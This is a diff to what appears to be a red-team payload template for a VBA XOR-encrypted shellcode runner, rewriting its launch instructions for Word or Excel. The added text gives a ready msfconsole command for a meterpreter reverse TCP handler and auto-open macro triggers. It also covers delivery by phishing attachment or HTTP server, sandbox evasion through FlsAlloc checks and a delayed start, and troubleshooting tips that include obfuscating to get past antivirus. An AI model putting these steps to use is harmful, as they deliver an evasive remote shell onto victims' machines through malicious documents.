@@ -49,6 +49,13 @@ parameters:
     required: false
     default: fa
 
+  - name: "office_app"
+    type: "choice"
+    description: "Target Office application (determines auto-execution trigger)"
+    required: false
+    default: "word"
+    choices: ["word", "excel"]
+
   - name: "output_file"
     type: "string"
     description: "Output VBA macro filename"
@@ -103,74 +110,51 @@ output:
   launch_instructions: |
     VBA Simple XOR Shellcode Runner - Launch Instructions
 
-    Step 1: Start Metasploit Listener
-
-    Start msfconsole and configure the handler:
-
+    Start Listener:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Or manually in msfconsole:
-
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {{ lhost }}
-    set LPORT {{ lport }}
-    set ExitOnSession false
-    exploit -j
-
-    Step 2: Create Office Document with Macro
-
-    Create a new Word or Excel document and add the macro:
-
-    In Microsoft Word:
-    1. Create new document
-    2. Press Alt+F11 to open VBA editor
+    Create Office Document:
+    {% if office_app == "word" %}1. Create new Word document
+    2. Alt+F11 (VBA editor)
     3. Insert > Module
-    4. Copy and paste the contents of {{ output_file }}
-    5. Save as .docm (Word Macro-Enabled Document) or .doc (Word 97-2003)
-
-    In Microsoft Excel:
-    1. Create new workbook
-    2. Press Alt+F11 to open VBA editor
+    4. Paste contents of {{ output_file }}
+    5. Save as .docm (Macro-Enabled) or .doc (97-2003){% else %}1. Create new Excel workbook
+    2. Alt+F11 (VBA editor)
     3. Insert > Module
-    4. Copy and paste the contents of {{ output_file }}
-    5. Save as .xlsm (Excel Macro-Enabled Workbook) or .xls (Excel 97-2003)
+    4. Paste contents of {{ output_file }}
+    5. Save as .xlsm (Macro-Enabled) or .xls (97-2003){% endif %}
 
-    Step 3: Transfer Document to Target
-
-    Transfer the macro-enabled document to the target:
-
-    Using Python HTTP server:
+    Transfer Document:
     python3 -m http.server 8080
+    Or via phishing email attachment
 
-    Using email (phishing scenario):
-    Attach the document to an email with appropriate social engineering
-
-    Using SMB share:
-    impacket-smbserver share . -smb2support
-
-    Step 4: Execute on Target
-
-    The macro will automatically execute when:
-    - Document is opened (if macros are enabled)
-    - User clicks "Enable Content" button
-
-    Note: The macro waits 10 seconds before execution (sandbox evasion)
-
-    Step 5: Verify Connection
-
-    Check your Metasploit console for incoming session:
-    Sending stage (200262 bytes) to [target_ip]
-    Meterpreter session 1 opened
+    Execute:
+    Macro auto-executes when document opened (if macros enabled)
+    Or user clicks "Enable Content" button
 
     Notes:
+    - XOR encrypted with key: 0x{{ xor_key }} (decimal {{ xor_key_decimal }})
+    - Auto-executes via {% if office_app == "word" %}Document_Open and AutoOpen{% else %}Workbook_Open and Auto_Open{% endif %} macros
+    - FlsAlloc-based sandbox detection (fails on VMs without Fiber Local Storage)
+    - 10-second sleep for time-based evasion (sandboxes often skip delays)
+    - Uses VirtualAlloc with RWX permissions for shellcode allocation
+    - Executes shellcode in separate thread via CreateThread
+    - EXITFUNC=thread ensures clean exit
+    - Reverse shell connects to {{ lhost }}:{{ lport }}
+    - Office macros heavily monitored; expect detection in production environments
 
-    - Encrypted with XOR key 0x{{ xor_key }} (decimal {{ xor_key_decimal }})
-    - Includes FlsAlloc-based sandbox detection
-    - Includes 10-second sleep for time-based evasion
-    - Auto-executes on document open via Document_Open and AutoOpen
-    - Uses VirtualAlloc with RWX permissions
-    - Executes shellcode in separate thread
+    Troubleshooting:
+    - Macro doesn't run: User must enable macros (Office security warning)
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - Immediate closure: FlsAlloc check may have failed (not a sandbox) or AV killed process
+    - AV blocks macro: VBA macros are well-known; consider obfuscation or alternative delivery
+    - Payload waits 10 seconds before execution (by design)
+    - Office Protected View: User must click "Enable Editing" then "Enable Content"
+    - Check Office Trust Center settings if macros disabled
+
+    Cleanup:
+    Delete document from target
+    No persistence unless document saved to startup folder
     - EXITFUNC=thread ensures clean exit
 
     Macro Security Considerations:
